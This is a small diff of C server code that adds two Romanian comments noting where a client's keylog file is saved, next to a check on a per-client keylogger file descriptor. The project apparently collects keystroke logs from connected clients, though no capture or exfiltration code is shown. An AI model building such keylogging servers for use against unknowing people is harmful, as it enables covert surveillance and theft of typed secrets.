@@ -104,6 +104,9 @@ void *handle_client(void *params)
         handleOpcode(client_message, args->client_sock);
     }
 
+    /*******************************Aici se salveaza fisierul de keylog*************************** */
+    //TO DO: De pus codul de mai jos intr-o functie
+
     char filename[BUFFER_SIZE];
     if (clientHndler.clientsAttr[args->client_sock].keylogger_fd != -1)
     {
